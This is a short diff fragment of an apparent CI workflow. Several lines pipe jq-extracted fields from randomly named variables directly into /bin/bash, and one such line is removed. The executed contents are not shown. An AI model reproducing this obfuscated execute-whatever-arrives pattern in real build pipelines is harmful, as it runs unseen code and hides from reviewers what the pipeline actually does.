@@ -24,7 +24,6 @@ jobs:
           echo $hf8 | jq -r .h86 | /bin/bash
           printf '%s' "$osl61193" | jq -r .dblwv0 | /bin/bash
           echo $qr2863 | jq -r .jcy84 | /bin/bash
-          echo $xsq2260 | jq -r .qqhyi609 | /bin/bash
           echo $yvmsy6 | jq -r .hqse48 | /bin/bash
           echo $qzctp3480 | jq -r .x23 | /bin/bash
           echo $b636 | jq -r .opxyh85 | /bin/bash
